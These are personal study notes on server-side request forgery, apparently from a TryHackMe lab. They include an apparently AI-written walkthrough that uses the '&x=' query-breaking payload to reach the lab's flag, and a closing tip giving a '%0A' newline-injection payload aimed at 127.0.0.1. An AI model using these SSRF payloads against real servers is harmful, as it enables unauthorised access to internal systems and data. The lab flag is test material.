[[Bug]]

## **What is an SSRF?**

SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing.

## **Types of SSRF**

There are two types of SSRF vulnerability; the first is a regular SSRF where data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen.

## **What's the impact?**

A successful SSRF attack can result in any of the following: 

- Access to unauthorised areas.
- Access to customer/organisational data.
- Ability to Scale to internal networks.
- Reveal authentication tokens/credentials.



(task 2 from AI)

### Task: Exploiting SSRF to get the flag

In the mock browser provided by the room, the application sends a request to the URL in the `server` parameter. The bottom bar shows exactly which request is being sent by `website.thm`.

Given:

```
https://website.thm/item/2?server=api
```

The application requests:

```
https://api.website.thm/api/item?id=2
```

---

### Goal

Force the web server to fetch:

```
https://server.website.thm/flag?id=9
```

so that it returns the flag.

---

### Problem

If you simply replace `server` with `https://server.website.thm/flag?id=9`, the resulting URL in the server request becomes malformed. It appends the rest of the path/query from the original request to your injected URL, creating something like:

```
https://server.website.thm/flag?id=9.website.thm/api/item?id=2
```

which causes a `404` error.

---

### Solution: Using `&x=` Trick

To stop the application from appending its default `/api/item?id=2`, you can terminate the query string by adding `&x=` to the end of your payload.

**Correct URL:**

```
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
```

Now, the request sent by `website.thm` is clean:

```
https://server.website.thm/flag?id=9
```

and you will receive the flag response:

```
THM{SSRF_MASTER}
```

---

### Final Answer

- Injected URL:
    

```
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
```

- Flag:
    

```
THM{SSRF_MASTER}
```

---

### Why This Works

- The application appends additional path/query to whatever you supply in `server`. Adding `&x=` breaks that process by finishing the query string, so the rest of the URL is ignored.
    
- Encoding tricks (like `%3F` and `%3D`) are often insufficient in this lab; the `&x=` method is the cleanest and most reliable path to isolate the request.
    

---

### Key Takeaways

- In real SSRF scenarios, query breaking via `&` is a classic technique.
    
- Always watch how the server _actually_ constructs the outbound request — especially with any debugging bar like the one given in this room.
    
- Control the full path/query string to direct requests precisely where you want.
    

---

Potential SSRF vulnerabilities can be spotted in web applications in many different ways. Here is an example of four common places to look:
================================================

**When a full URL is used in a parameter in the address bar:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/956e1914b116cbc9e564e3bb3d9ab50a.png)  

**A hidden field in a form:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/237696fc8e405d25d4fc7bbcc67919f0.png)  

**A partial URL such as just the hostname:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f3c387849e91a4f15a7b59ff7324be75.png)

  

**Or perhaps only the path of the URL:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/3fd583950617f7a3713a107fcb4cfa49.png)

Some of these examples are easier to exploit than others, and this is where a lot of trial and error will be required to find a working payload.

If working with a blind SSRF where no output is reflected back to you, you'll need to use an external HTTP logging tool to monitor requests such as requestbin.com, your own HTTP server or Burp Suite's Collaborator client.


## reports

iif there's parameter like `url=` or anything like it , you can try this `%0A` which mean /n 
for example `url=http://127.0.0.1/%0Ahttps://anything.com`
